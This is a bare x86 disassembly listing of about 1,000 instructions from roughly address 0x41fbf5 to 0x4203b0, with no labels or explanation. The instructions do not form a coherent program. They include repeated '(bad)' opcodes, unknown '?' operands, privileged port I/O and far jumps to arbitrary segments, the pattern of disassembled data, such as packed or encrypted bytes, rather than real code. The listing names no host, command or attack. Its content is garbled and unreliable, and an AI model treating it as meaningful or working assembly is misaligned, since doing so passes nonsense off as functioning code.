  41fbf5:	test   BYTE PTR [ecx-0x58d98b7d],0x0
  41fbfc:	sub    eax,eax
  41fbfe:	jo     0x41fb81
  41fc00:	sti    
  41fc01:	shr    BYTE PTR [ecx],cl
  41fc03:	jecxz  0x41fc02
  41fc05:	je     0x41fbd3
  41fc07:	cld    
  41fc08:	and    eax,0x4da4f264
  41fc0d:	mov    eax,ds:0x3efd0a4c
  41fc12:	dec    ebx
  41fc13:	mov    esp,DWORD PTR [ecx+0x16]
  41fc16:	(bad)  
  41fc19:	inc    esi
  41fc1a:	test   al,0x57
  41fc1c:	retf   
  41fc1d:	sbb    BYTE PTR [edi+edx*4-0xee3ee1],0xfd
  41fc25:	xor    DWORD PTR [edi],ecx
  41fc27:	mov    edx,0x8480cf50
  41fc2c:	daa    
  41fc2d:	cmp    BYTE PTR [esi-0x33],bh
  41fc30:	xor    DWORD PTR [ebp-0x40],ebp
  41fc33:	dec    esi
  41fc34:	add    al,0x62
  41fc36:	jp     0x41fc2e
  41fc38:	lods   eax,DWORD PTR ds:[esi]
  41fc39:	outs   dx,BYTE PTR ds:[esi]
  41fc3a:	data16 cli 
  41fc3c:	push   ds
  41fc3d:	jl     0x41fbc9
  41fc3f:	cs push ss
  41fc41:	mov    ebx,0x58c2f1e4
  41fc46:	jo     0x41fbd2
  41fc48:	enter  0x8e1b,0x7d
  41fc4c:	ror    ebx,0xf9
  41fc4f:	jo     0x41fbe2
  41fc51:	push   cs
  41fc52:	gs pop esp
  41fc54:	mov    es,WORD PTR [ebx+edi*1-0x33]
  41fc58:	(bad)  
  41fc5a:	jmp    0x41fc2a
  41fc5c:	popa   
  41fc5d:	arpl   sp,dx
  41fc5f:	sbb    dh,BYTE PTR [esi]
  41fc61:	jmp    0x735d0007
  41fc66:	dec    ecx
  41fc67:	cdq    
  41fc68:	jae    0x41fc11
  41fc6a:	fidiv  DWORD PTR [ebp+0x7b]
  41fc6d:	xor    edx,DWORD PTR [eax+0x1fcea52b]
  41fc73:	inc    BYTE PTR [ebx]
  41fc75:	adc    edi,DWORD PTR [ebx]
  41fc77:	test   eax,0x81c4679
  41fc7c:	cmp    edi,DWORD PTR [eax]
  41fc7e:	push   eax
  41fc7f:	sub    edi,ebx
  41fc81:	sub    eax,0xba402890
  41fc86:	lods   eax,DWORD PTR ds:[esi]
  41fc87:	dec    esp
  41fc88:	jecxz  0x41fc25
  41fc8a:	or     ebx,esi
  41fc8c:	sbb    BYTE PTR [ebp-0x4489fc06],al
  41fc92:	push   0xeaddea7f
  41fc97:	std    
  41fc98:	mov    dl,0x87
  41fc9a:	mov    WORD PTR [ebp+0x508c9410],gs
  41fca0:	lock xor al,0xf2
  41fca3:	sub    bl,bh
  41fca5:	inc    ebp
  41fca6:	sub    al,0xd4
  41fca8:	leave  
  41fca9:	mov    ebx,0x58daa8bd
  41fcae:	rcr    esi,0x24
  41fcb1:	xchg   ecx,eax
  41fcb2:	sub    BYTE PTR [ebp+edi*8+0x4a],dh
  41fcb6:	popa   
  41fcb7:	jge    0x41fc94
  41fcb9:	and    BYTE PTR [ebx-0x6707e5a],dl
  41fcbf:	mov    ds,WORD PTR [edi+0x56fc9b5c]
  41fcc5:	fbld   TBYTE PTR [ebx]
  41fcc7:	jmp    0xa40:0x1cef5d5d
  41fcce:	dec    ebp
  41fccf:	sbb    ebx,edx
  41fcd1:	sub    BYTE PTR ds:0xa59377c8,cl
  41fcd7:	aam    0xb5
  41fcd9:	out    0xfd,eax
  41fcdb:	mov    edx,ebp
  41fcdd:	gs scas eax,DWORD PTR es:[edi]
  41fcdf:	sbb    edx,DWORD PTR [esi+0x20d93a7]
  41fce5:	push   ds
  41fce6:	mov    dh,0x32
  41fce8:	cld    
  41fce9:	mov    ds:0xca7a852d,al
  41fcee:	pop    es
  41fcef:	sub    al,bl
  41fcf1:	repnz out dx,eax
  41fcf3:	and    eax,DWORD PTR [eax]
  41fcf5:	clc    
  41fcf6:	in     al,dx
  41fcf7:	jns    0x41fd09
  41fcf9:	push   esi
  41fcfa:	shl    DWORD PTR [edi+0x7e],cl
  41fcfd:	test   al,0x63
  41fcff:	push   esi
  41fd00:	ss add eax,0xc1daf671
  41fd06:	mov    WORD PTR [ebp+0x23ee32d4],ds
  41fd0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd0d:	jns    0x41fc9c
  41fd0f:	jmp    FWORD PTR [esi-0xf448743]
  41fd15:	dec    edi
  41fd16:	inc    eax
  41fd17:	pop    es
  41fd18:	call   FWORD PTR [ebx]
  41fd1a:	xchg   ecx,eax
  41fd1b:	adc    DWORD PTR [ecx],0x1
  41fd1e:	imul   ecx,esi,0xad0be433
  41fd24:	adc    al,0x17
  41fd26:	mov    edi,edi
  41fd28:	nop
  41fd29:	enter  0x2866,0xe0
  41fd2d:	shl    DWORD PTR [edx-0x3886b0db],0x4e
  41fd34:	add    al,BYTE PTR [ecx]
  41fd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd37:	push   0x67
  41fd39:	add    bl,ah
  41fd3b:	loope  0x41fcfd
  41fd3d:	dec    esp
  41fd3e:	cmp    al,0xca
  41fd40:	out    0xb5,eax
  41fd42:	loop   0x41fd9e
  41fd44:	test   DWORD PTR [ebx+ebx*8-0x6ed1bee1],edi
  41fd4b:	inc    ebx
  41fd4c:	xchg   ebx,eax
  41fd4d:	push   ecx
  41fd4e:	pop    ds
  41fd4f:	pop    ds
  41fd50:	fwait
  41fd51:	div    ah
  41fd53:	mov    ds:0x2fc5d577,eax
  41fd58:	dec    edi
  41fd59:	jcxz   0x41fcff
  41fd5c:	inc    ebp
  41fd5d:	repnz fyl2xp1 
  41fd60:	mov    al,ds:0x4782f4e2
  41fd65:	cld    
  41fd66:	xchg   esi,eax
  41fd67:	(bad)  
  41fd68:	cld    
  41fd69:	and    ax,0x4d02
  41fd6d:	mov    BYTE PTR [edx+0x713d0ab0],bh
  41fd73:	repz sbb esi,DWORD PTR [edi+esi*1-0x2d]
  41fd78:	and    al,0xa7
  41fd7a:	adc    DWORD PTR [edi],esi
  41fd7c:	add    BYTE PTR [ebx-0x6],ah
  41fd7f:	jmp    DWORD PTR [esi+0x6342124]
  41fd85:	push   esp
  41fd86:	dec    ebx
  41fd87:	or     ch,bl
  41fd89:	sbb    eax,0x304c0c88
  41fd8e:	mov    esp,DWORD PTR [edx+0x4308daac]
  41fd94:	and    ecx,0x3
  41fd97:	outs   dx,BYTE PTR ds:[esi]
  41fd98:	adc    al,0x1d
  41fd9a:	pop    ds
  41fd9b:	mov    edi,0xbda34e48
  41fda0:	dec    ecx
  41fda1:	iret   
  41fda2:	std    
  41fda3:	int    0x50
  41fda5:	nop
  41fda6:	hlt    
  41fda7:	sar    ebp,1
  41fda9:	ficomp WORD PTR [ecx-0x2a]
  41fdac:	xchg   DWORD PTR [edi],ebx
  41fdae:	ficomp DWORD PTR [si]
  41fdb1:	push   edx
  41fdb2:	(bad)  [ecx+0x12]
  41fdb5:	mov    DWORD PTR [esi+0xc],edi
  41fdb8:	jl     0x41fd78
  41fdba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdbb:	dec    edx
  41fdbc:	mov    dl,0xc8
  41fdbe:	stos   DWORD PTR es:[edi],eax
  41fdbf:	xor    esi,DWORD PTR [esi-0x6]
  41fdc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc3:	pop    eax
  41fdc4:	cwde   
  41fdc5:	mov    ch,0x74
  41fdc7:	adc    al,0x13
  41fdc9:	pop    ebx
  41fdca:	lods   eax,DWORD PTR ds:[esi]
  41fdcb:	pushf  
  41fdcc:	pop    ds
  41fdcd:	test   eax,0x974942ad
  41fdd2:	bnd js 0x41fd88
  41fdd5:	fsub   DWORD PTR [edx+0xf055d41]
  41fddb:	or     ecx,edi
  41fddd:	mov    eax,ds:0x2afe8610
  41fde2:	mov    ebx,0x52692569
  41fde7:	jl     0x41fe48
  41fde9:	lods   eax,DWORD PTR ds:[esi]
  41fdea:	jb     0x41fe03
  41fdec:	inc    esp
  41fded:	call   0x76e3:0xf090bca2
  41fdf4:	xor    cl,dl
  41fdf6:	jl     0x41fdcb
  41fdf8:	ja     0x41fd7a
  41fdfa:	pushf  
  41fdfb:	jb     0x41fdde
  41fdfd:	xchg   ecx,eax
  41fdfe:	addr16 retf 
  41fe00:	daa    
  41fe01:	sti    
  41fe02:	sub    bl,BYTE PTR [ebx+0x60]
  41fe05:	imul   edx,DWORD PTR [esi-0x25e80441],0xffffff84
  41fe0c:	sub    bl,ch
  41fe0e:	popa   
  41fe0f:	jne    0x41fdc4
  41fe11:	es loope 0x41fdc5
  41fe14:	(bad)  
  41fe15:	fldenv [edx+0x5a6cb91e]
  41fe1b:	mov    ds:0x3ed66a56,al
  41fe20:	repz bound ebp,QWORD PTR [eax+0x35fbd22d]
  41fe27:	mov    edx,0xb6f53a1b
  41fe2c:	outs   dx,DWORD PTR ds:[esi]
  41fe2d:	sub    al,0x25
  41fe2f:	xchg   ebp,eax
  41fe30:	cmp    eax,0xf7ce5bd
  41fe35:	push   esp
  41fe36:	and    esi,DWORD PTR [edx]
  41fe38:	mov    esp,0x2903466b
  41fe3d:	sbb    ah,BYTE PTR [eax+0x396fbe30]
  41fe43:	shr    DWORD PTR [esi-0x6e3ea0f0],0x88
  41fe4a:	jecxz  0x41feaa
  41fe4c:	sub    ah,bl
  41fe4e:	sbb    ah,0xc3
  41fe51:	adc    DWORD PTR [ebx],esi
  41fe53:	lea    ebx,ds:0xabdba0ca
  41fe59:	in     eax,0x72
  41fe5b:	repnz into 
  41fe5d:	push   esp
  41fe5e:	xchg   ecx,eax
  41fe5f:	inc    esi
  41fe60:	test   BYTE PTR [edi+0x13],ch
  41fe63:	adc    edx,DWORD PTR [edx]
  41fe65:	cli    
  41fe66:	neg    DWORD PTR [edx-0x60d74cbc]
  41fe6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe6d:	jmp    0x41fe18
  41fe6f:	int    0xa2
  41fe71:	xor    ebp,DWORD PTR [edx+0x27]
  41fe74:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe76:	cmp    al,0x9a
  41fe78:	xor    DWORD PTR [esi+edx*8-0x41],ebx
  41fe7c:	in     eax,dx
  41fe7d:	in     eax,0x2e
  41fe7f:	and    ebx,ecx
  41fe81:	(bad)  
  41fe82:	pusha  
  41fe83:	push   ecx
  41fe84:	fs icebp 
  41fe86:	sbb    BYTE PTR [ebx+0x38ea2276],0xa1
  41fe8d:	mov    gs,WORD PTR fs:[ecx+0x276c0c0f]
  41fe94:	cld    
  41fe95:	adc    al,0x5d
  41fe97:	inc    ecx
  41fe98:	in     al,0x7d
  41fe9a:	gs ret 
  41fe9c:	pop    ecx
  41fe9d:	sub    al,0x13
  41fe9f:	xchg   esp,eax
  41fea0:	xchg   BYTE PTR [ebx+0x32],cl
  41fea3:	jmp    0xb7c261e7
  41fea8:	mov    ?,WORD PTR [ecx+0x32]
  41feab:	aas    
  41feac:	push   ebp
  41fead:	jle    0x41fe73
  41feaf:	xchg   ebx,eax
  41feb0:	mov    bh,0x56
  41feb2:	or     eax,DWORD PTR [edx*1-0x7358f101]
  41feb9:	icebp  
  41feba:	shl    edx,cl
  41febc:	pop    edi
  41febd:	xor    BYTE PTR [eax],0x7e
  41fec0:	in     eax,0xf
  41fec2:	stc    
  41fec3:	pop    edi
  41fec4:	push   ebp
  41fec5:	mov    bh,0x2e
  41fec7:	sbb    al,0x73
  41fec9:	jg     0x41ff28
  41fecb:	leave  
  41fecc:	mov    edi,0x357c1c03
  41fed1:	push   cs
  41fed2:	mov    ah,al
  41fed4:	mov    cl,ah
  41fed6:	(bad)  
  41fed7:	test   eax,0xa53a5ad4
  41fedc:	add    eax,0x1f684425
  41fee1:	jbe    0x41ff09
  41fee3:	cmc    
  41fee4:	cs xor eax,0xeb1dfd83
  41feea:	mul    ecx
  41feec:	push   ebx
  41feed:	call   DWORD PTR [eax]
  41feef:	je     0x41ff18
  41fef1:	outs   dx,DWORD PTR ds:[esi]
  41fef2:	popf   
  41fef3:	popa   
  41fef4:	aad    0x3e
  41fef6:	ret    
  41fef7:	add    ebx,esi
  41fef9:	fistp  QWORD PTR [eax+edx*4]
  41fefc:	mov    BYTE PTR [eax-0x32],bh
  41feff:	jle    0x41feeb
  41ff01:	cmp    BYTE PTR [edi+ecx*2-0x51a3fea7],dh
  41ff08:	inc    esi
  41ff09:	jg     0x41fee5
  41ff0b:	test   eax,0x90619910
  41ff10:	push   ss
  41ff11:	mov    WORD PTR [esi+0x7b],?
  41ff14:	adc    esp,DWORD PTR [edx-0x11ea47cf]
  41ff1a:	das    
  41ff1b:	arpl   WORD PTR [edx],dx
  41ff1d:	inc    edi
  41ff1e:	imul   edx,DWORD PTR [ebx+ebx*8+0x4],0x39f997fe
  41ff26:	in     al,dx
  41ff27:	and    bl,al
  41ff29:	outs   dx,BYTE PTR ds:[esi]
  41ff2a:	inc    edx
  41ff2b:	iret   
  41ff2c:	cdq    
  41ff2d:	push   esp
  41ff2e:	jnp    0x41ff7c
  41ff30:	mov    esi,0xbfc24d26
  41ff35:	or     dl,BYTE PTR [edx+0xebd42e2]
  41ff3b:	add    ebp,DWORD PTR [eax+0x78ab6c92]
  41ff41:	or     dh,al
  41ff43:	out    0xad,eax
  41ff45:	pushf  
  41ff46:	js     0x41fef0
  41ff48:	ins    DWORD PTR es:[edi],dx
  41ff49:	mov    cl,0xc6
  41ff4b:	call   0x6bc6cb50
  41ff50:	loope  0x41ff30
  41ff52:	mov    edi,0xd3359666
  41ff57:	std    
  41ff58:	in     al,0xde
  41ff5a:	xlat   BYTE PTR ds:[ebx]
  41ff5b:	mov    ds:0xe5d65c7f,eax
  41ff60:	les    edi,FWORD PTR [eax+0x1a]
  41ff63:	ret    0x8028
  41ff66:	js     0x41ff7b
  41ff68:	bound  esp,QWORD PTR [ebp+eiz*4-0xf92120f]
  41ff6f:	popf   
  41ff70:	test   esi,esp
  41ff72:	jns    0x41ff24
  41ff74:	mov    ds:0x5575c2bf,eax
  41ff79:	jmp    FWORD PTR [ecx+ecx*8-0x21]
  41ff7d:	aad    0xfb
  41ff7f:	stos   BYTE PTR es:[edi],al
  41ff80:	lods   eax,DWORD PTR ds:[esi]
  41ff81:	xor    BYTE PTR fs:[eax+eax*1],0x43
  41ff86:	(bad)  
  41ff87:	test   DWORD PTR [ecx],0xc1f3314
  41ff8d:	push   bx
  41ff8f:	shl    BYTE PTR [ebx+0x33],cl
  41ff92:	rcr    DWORD PTR [esi-0x295064ff],1
  41ff98:	ins    DWORD PTR es:[edi],dx
  41ff99:	into   
  41ff9a:	fistp  QWORD PTR [edi+0x4ec8528f]
  41ffa0:	add    BYTE PTR [ebp-0x4c],dl
  41ffa3:	imul   esp,DWORD PTR [edi+eax*2],0x4b
  41ffa7:	daa    
  41ffa8:	sub    ebp,edi
  41ffaa:	and    BYTE PTR [edi+0x59663421],ch
  41ffb0:	ror    DWORD PTR [esi-0x4d8b3c2a],1
  41ffb6:	shl    BYTE PTR [edx+0x359fd86b],cl
  41ffbc:	ins    DWORD PTR es:[edi],dx
  41ffbd:	ret    
  41ffbe:	dec    ebx
  41ffbf:	test   al,0x58
  41ffc1:	or     BYTE PTR ds:0xfb4020d0,0x59
  41ffc8:	mov    esi,0xb0f7c5ea
  41ffcd:	dec    edi
  41ffce:	mov    ah,BYTE PTR [ecx+0x5c]
  41ffd1:	xor    eax,0x403d7338
  41ffd6:	out    dx,eax
  41ffd7:	xchg   ecx,eax
  41ffd8:	pop    ebx
  41ffd9:	cwde   
  41ffda:	test   ecx,0x121bafc3
  41ffe0:	pop    ss
  41ffe1:	sub    eax,0xcd237bcb
  41ffe6:	mov    ebp,DWORD PTR [edi]
  41ffe8:	les    ecx,FWORD PTR [eax+0x75]
  41ffeb:	fisub  DWORD PTR [ebx]
  41ffed:	cli    
  41ffee:	inc    ebx
  41ffef:	data16 sbb bl,ch
  41fff2:	hlt    
  41fff3:	sub    eax,0x18067646
  41fff8:	mov    cl,bl
  41fffa:	mov    esi,0x91937515
  41ffff:	xor    al,0x49
  420001:	scas   al,BYTE PTR es:[edi]
  420002:	inc    ebp
  420003:	mov    dh,BYTE PTR [eax-0x688cb161]
  420009:	ror    DWORD PTR [eax-0x26],1
  42000c:	rol    esp,cl
  42000e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42000f:	pop    ecx
  420010:	pop    eax
  420011:	add    dl,BYTE PTR [ecx-0x84c0811]
  420017:	cmp    ch,0x6
  42001a:	out    0x3f,eax
  42001c:	sub    al,0xc3
  42001e:	pop    ebx
  42001f:	mov    ecx,0xa0dbc20e
  420024:	loope  0x41ffd7
  420026:	adc    DWORD PTR [ecx-0x17c74e83],eax
  42002c:	inc    edx
  42002d:	and    eax,0xe99c0782
  420032:	cmp    eax,0xda7c6f35
  420037:	inc    ecx
  420038:	add    esi,DWORD PTR [eax+0xdc18738]
  42003e:	pop    eax
  42003f:	cmp    al,0x22
  420041:	enter  0xc463,0x8d
  420045:	dec    eax
  420046:	jmp    0x3b62e296
  42004b:	fisub  WORD PTR ds:0xffbf37bc
  420051:	jnp    0x420068
  420053:	cmc    
  420054:	and    esp,DWORD PTR [eax-0x3b4d77e]
  42005a:	cwde   
  42005b:	fs ret 
  42005d:	loop   0x4200aa
  42005f:	dec    edx
  420060:	clc    
  420061:	mov    esi,0x3a46246e
  420066:	pop    es
  420067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420068:	pop    esi
  420069:	pop    ebx
  42006a:	dec    edi
  42006b:	scas   eax,DWORD PTR es:[edi]
  42006c:	out    0xb0,al
  42006e:	mov    bl,0x7a
  420070:	mov    ?,WORD PTR [edi+0x59]
  420073:	push   esi
  420074:	ja     0x41fffa
  420076:	enter  0xad92,0x84
  42007a:	cmp    DWORD PTR [edi+0x3a0030d0],ebp
  420080:	fisttp QWORD PTR [edx]
  420082:	aad    0x40
  420084:	lahf   
  420085:	add    eax,0xc315fb7
  42008a:	mov    dh,0x9f
  42008c:	pop    esi
  42008d:	mov    esi,0xdb097af4
  420092:	data16 fisttp WORD PTR [ebx]
  420095:	in     eax,0x63
  420097:	pusha  
  420098:	popa   
  420099:	jge    0x420097
  42009b:	stos   DWORD PTR es:[edi],eax
  42009c:	addr16 int3 
  42009e:	or     ecx,edi
  4200a0:	mov    eax,0xe4d6c5
  4200a5:	inc    esp
  4200a6:	enter  0xeb3a,0xd4
  4200aa:	pop    esi
  4200ab:	xor    dl,BYTE PTR [ebp+edi*1-0x5620676e]
  4200b2:	enter  0x576a,0x6
  4200b6:	inc    eax
  4200b7:	cli    
  4200b8:	add    dl,ah
  4200ba:	pop    edi
  4200bb:	sub    ecx,esp
  4200bd:	mov    esp,0x19d0d28a
  4200c2:	add    eax,0xbaad2d66
  4200c7:	cdq    
  4200c8:	stos   DWORD PTR es:[edi],eax
  4200c9:	sub    ebp,DWORD PTR [ebx+0x420ecaa2]
  4200cf:	dec    edx
  4200d0:	aam    0xf8
  4200d2:	mov    ebp,0xe3c2af6f
  4200d7:	in     eax,0x2e
  4200d9:	scas   al,BYTE PTR es:[edi]
  4200da:	adc    ecx,DWORD PTR [edx+0x8b4ce58]
  4200e0:	out    0xab,eax
  4200e2:	add    DWORD PTR [edx-0xf],ebx
  4200e5:	xchg   edi,eax
  4200e6:	out    dx,al
  4200e7:	mov    ah,BYTE PTR [esi]
  4200e9:	jmp    0x4200a2
  4200eb:	mov    ebp,0x51e7729b
  4200f0:	cmp    DWORD PTR [edi],ecx
  4200f2:	jmp    DWORD PTR [edi-0x39ad7ee3]
  4200f8:	and    al,0xc2
  4200fa:	clc    
  4200fb:	fwait
  4200fc:	inc    edi
  4200fd:	ja     0x4200c6
  4200ff:	jns    0x4200a3
  420101:	fs leave 
  420103:	int3   
  420104:	adc    eax,0xb765f730
  420109:	loope  0x4200d7
  42010b:	mov    dl,0x2e
  42010d:	adc    al,0x9c
  42010f:	mov    bh,0xa7
  420111:	push   cs
  420112:	sar    DWORD PTR [ebp-0x54],cl
  420115:	or     DWORD PTR [ebp+0x50],0xffffffe7
  420119:	sub    bl,bl
  42011b:	out    0x58,al
  42011d:	mov    ds:0x3dbc0753,eax
  420122:	(bad)  
  420123:	pusha  
  420124:	xor    BYTE PTR [esi+0x0],0x57
  420128:	out    dx,al
  420129:	inc    edi
  42012a:	daa    
  42012b:	shr    DWORD PTR [esi],0x41
  42012e:	iret   
  42012f:	scas   eax,DWORD PTR es:[edi]
  420130:	xor    BYTE PTR ss:[ebx-0x51fb220c],0x75
  420138:	(bad)  
  420139:	repnz repz lock pop edx
  42013d:	in     eax,0x45
  42013f:	add    ch,ah
  420141:	mov    ch,0xd3
  420143:	rol    BYTE PTR [ebp+0x79],cl
  420146:	(bad)  
  420147:	xchg   esi,eax
  420148:	test   eax,0xc0f0afc5
  42014d:	ret    
  42014e:	xlat   BYTE PTR ds:[ebx]
  42014f:	into   
  420150:	mov    ebx,0x1b751ae8
  420155:	call   0x89be9e11
  42015a:	pushf  
  42015b:	adc    ch,dl
  42015d:	or     BYTE PTR [ebx+0x7c534181],al
  420163:	out    0x88,eax
  420165:	lods   al,BYTE PTR ds:[esi]
  420166:	dec    esp
  420167:	test   DWORD PTR [esi-0xc4dcec2],ebx
  42016d:	mov    ds:0x77a27a1c,al
  420172:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420174:	or     BYTE PTR [ecx],bl
  420176:	aad    0x5f
  420178:	push   edi
  420179:	mov    ebp,0x31528f9
  42017e:	jmp    0x42014e
  420180:	dec    ebx
  420181:	rol    ah,0x6a
  420184:	jle    0x420181
  420186:	dec    edx
  420187:	adc    eax,esi
  420189:	stc    
  42018a:	das    
  42018b:	push   0x53
  42018d:	dec    ecx
  42018e:	stos   DWORD PTR es:[edi],eax
  42018f:	lock dec edi
  420191:	jbe    0x420152
  420193:	push   eax
  420194:	mov    edi,0xaef35217
  420199:	sbb    ebp,DWORD PTR [ebp-0x2f7f2e3c]
  42019f:	dec    ecx
  4201a0:	int3   
  4201a1:	jl     0x420132
  4201a3:	inc    edx
  4201a4:	jle    0x42019b
  4201a6:	adc    esi,DWORD PTR [eax-0x65345a4e]
  4201ac:	cmp    ch,ah
  4201ae:	xor    esi,edi
  4201b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201b1:	xor    edi,ecx
  4201b3:	pop    ecx
  4201b4:	ins    DWORD PTR es:[edi],dx
  4201b5:	fsub   st(7),st
  4201b7:	es or  edx,ecx
  4201ba:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4201bc:	xchg   DWORD PTR [ebp*2+0x2fa657cb],ecx
  4201c3:	(bad)  
  4201c4:	imul   eax,DWORD PTR [eax],0xa22f32a8
  4201ca:	push   cs
  4201cb:	add    BYTE PTR [edi+edi*1-0x7d11918e],cl
  4201d2:	es sub al,0x4e
  4201d5:	push   esi
  4201d6:	mov    ecx,0xde3ed30b
  4201dc:	retf   
  4201dd:	mov    ds:0x7c4353f1,eax
  4201e2:	jmp    0x42023f
  4201e4:	or     ecx,DWORD PTR [edi+0x2e080c8a]
  4201ea:	mov    bh,dh
  4201ec:	outs   dx,DWORD PTR ds:[esi]
  4201ed:	push   esp
  4201ee:	cmp    al,0x5
  4201f0:	stos   BYTE PTR es:[edi],al
  4201f1:	fnsave [ecx]
  4201f3:	jo     0x42017e
  4201f5:	test   eax,0xc1f4fbd5
  4201fa:	lock scas al,BYTE PTR es:[edi]
  4201fc:	pop    ebx
  4201fd:	shr    ebp,0x85
  420200:	sub    al,0xc0
  420202:	mov    esi,fs
  420204:	ins    DWORD PTR es:[edi],dx
  420205:	nop
  420206:	push   0xb97a2df4
  42020b:	cmc    
  42020c:	sub    ecx,esi
  42020e:	mov    cl,0xc1
  420210:	xchg   esp,eax
  420211:	stos   DWORD PTR es:[edi],eax
  420212:	add    bl,ah
  420214:	ret    
  420215:	xor    al,0x11
  420217:	inc    ebp
  420218:	xor    edi,DWORD PTR [ecx+ebx*1-0x35]
  42021c:	jle    0x42024a
  42021e:	xor    al,al
  420220:	mov    edi,0x6276eca7
  420225:	push   esp
  420226:	popf   
  420227:	enter  0x8d25,0xcd
  42022b:	fcmovb st,st(0)
  42022d:	lods   eax,DWORD PTR ds:[esi]
  42022e:	mov    cl,BYTE PTR ds:0x6ba74437
  420234:	cmp    esi,DWORD PTR [ecx]
  420236:	push   0x35c56759
  42023b:	jge    0x42029d
  42023d:	and    BYTE PTR [edx+0x7206d91b],dl
  420243:	sbb    al,0xca
  420245:	popf   
  420246:	push   eax
  420247:	pushf  
  420248:	mov    eax,0xf915d7cb
  42024d:	sar    bl,0x6b
  420250:	add    edx,esp
  420252:	mov    cs,WORD PTR [esi]
  420254:	mov    edx,0x9568fbfb
  420259:	cmp    eax,0x59169c6b
  42025e:	shl    BYTE PTR [eax+eiz*8-0x78],cl
  420262:	xchg   edi,eax
  420263:	cwde   
  420264:	jp     0x420267
  420266:	jmp    0x8509:0xd38d9ba7
  42026d:	mov    eax,ds:0xdf297a93
  420272:	push   ss
  420273:	and    DWORD PTR [edi+0x30],esp
  420276:	fsubr  st,st(7)
  420278:	outs   dx,DWORD PTR ds:[esi]
  420279:	das    
  42027a:	jbe    0x4202a5
  42027c:	mov    BYTE PTR [esi-0x37],bh
  42027f:	mov    ds:0x1db7bff4,eax
  420284:	jae    0x42022f
  420286:	and    ch,0x23
  420289:	pop    eax
  42028a:	push   ebp
  42028b:	adc    DWORD PTR [esi-0x40],esi
  42028e:	out    0x39,al
  420290:	retf   
  420291:	inc    edi
  420292:	daa    
  420293:	jge    0x42024f
  420295:	sti    
  420296:	jge    0x42021e
  420298:	push   ds
  420299:	dec    eax
  42029a:	imul   esp,ecx,0xffffff85
  42029d:	pop    edx
  42029e:	dec    eax
  42029f:	pop    es
  4202a0:	fwait
  4202a1:	in     eax,dx
  4202a2:	daa    
  4202a3:	mov    dh,0x7a
  4202a5:	push   cs
  4202a6:	sbb    eax,0x9f9bd7d1
  4202ab:	hlt    
  4202ac:	mov    edi,0xbc3abaac
  4202b1:	(bad)  
  4202b2:	sbb    esi,DWORD PTR [edi-0x12]
  4202b5:	xchg   esp,eax
  4202b6:	or     al,0xf
  4202b8:	xchg   ebx,eax
  4202b9:	jl     0x420243
  4202bb:	mov    eax,0x2359212b
  4202c0:	push   0xffffffff
  4202c2:	add    DWORD PTR [edx-0xe],edi
  4202c5:	sbb    eax,0x96f08ed3
  4202ca:	mov    ebx,0x1ba28ccd
  4202cf:	in     eax,0xa7
  4202d1:	loop   0x420263
  4202d3:	repz icebp 
  4202d5:	or     edi,esi
  4202d7:	(bad)  
  4202d8:	and    eax,0xd437554e
  4202dd:	inc    edi
  4202de:	dec    ebp
  4202df:	iret   
  4202e0:	xchg   DWORD PTR [ebx],ebx
  4202e2:	push   es
  4202e3:	es dec ebx
  4202e5:	jg     0x420358
  4202e7:	scas   eax,DWORD PTR es:[edi]
  4202e8:	mov    eax,ds:0xc63e903a
  4202ed:	cmp    bl,cl
  4202ef:	inc    esp
  4202f0:	(bad)  
  4202f1:	out    0x80,al
  4202f3:	sbb    cl,BYTE PTR [ecx-0x6e]
  4202f6:	push   ss
  4202f7:	in     al,0x49
  4202f9:	inc    DWORD PTR [eax+0x53e9c5de]
  4202ff:	sub    eax,DWORD PTR ds:0xfeea9f96
  420305:	push   0xd9718d68
  42030a:	test   BYTE PTR [eax+esi*2-0x52],0xc0
  42030f:	ds mov edx,0xabe42662
  420315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420316:	add    al,0xb5
  420318:	mov    dl,0x18
  42031a:	push   ebp
  42031b:	retfw  
  42031d:	cdq    
  42031e:	xchg   esp,eax
  42031f:	lds    esp,FWORD PTR [ebp-0x65]
  420322:	sbb    BYTE PTR [ebp+0x4c],bl
  420325:	lods   eax,DWORD PTR ds:[esi]
  420326:	js     0x420353
  420328:	in     eax,dx
  420329:	mov    eax,ds:0x74e8bc25
  42032e:	inc    edi
  42032f:	mov    WORD PTR [ecx],ds
  420331:	mov    ?,edi
  420333:	sub    eax,0x296d5f9f
  420338:	mov    ecx,0x1e0d6095
  42033d:	(bad)  
  42033e:	or     ebp,DWORD PTR [esi+0xe96e3f2]
  420344:	mov    eax,0xa44f7bd2
  420349:	(bad)  
  42034a:	or     ebx,ecx
  42034c:	mov    BYTE PTR ds:0x9e691a29,dl
  420352:	push   cs
  420353:	fcom   st(7)
  420355:	pop    ss
  420356:	cdq    
  420357:	(bad)  
  420358:	nop
  420359:	jbe    0x4203af
  42035b:	test   DWORD PTR [ebp-0x41f2d062],0x55898bef
  420365:	outs   dx,DWORD PTR fs:[esi]
  420367:	mov    eax,ds:0x2bb6205f
  42036c:	pusha  
  42036d:	retf   
  42036e:	xchg   edx,eax
  42036f:	shr    DWORD PTR [ebp+esi*4+0x79d9cd7e],cl
  420376:	add    al,0xc6
  420378:	stc    
  420379:	adc    al,0x1e
  42037b:	mov    edi,0xaf65aa1f
  420380:	jmp    0x8bd1:0xc7311a3e
  420387:	retf   0x8ceb
  42038a:	push   esi
  42038b:	and    ebp,DWORD PTR [eax-0x1937f8e6]
  420391:	push   ebp
  420392:	adc    eax,0x5eb852ac
  420397:	add    edi,edi
  420399:	jae    0x4203a2
  42039b:	fadd   st,st(1)
  42039d:	jp     0x4203f2
  42039f:	test   eax,0xcd6bf972
  4203a4:	xlat   BYTE PTR ds:[ebx]
  4203a5:	retf   0xd39c
  4203a8:	xor    eax,0x50bd2006
  4203ad:	ret    0xc8a3
  4203b0:	mov    DWORD PTR [eax-0x195186d9],ecx
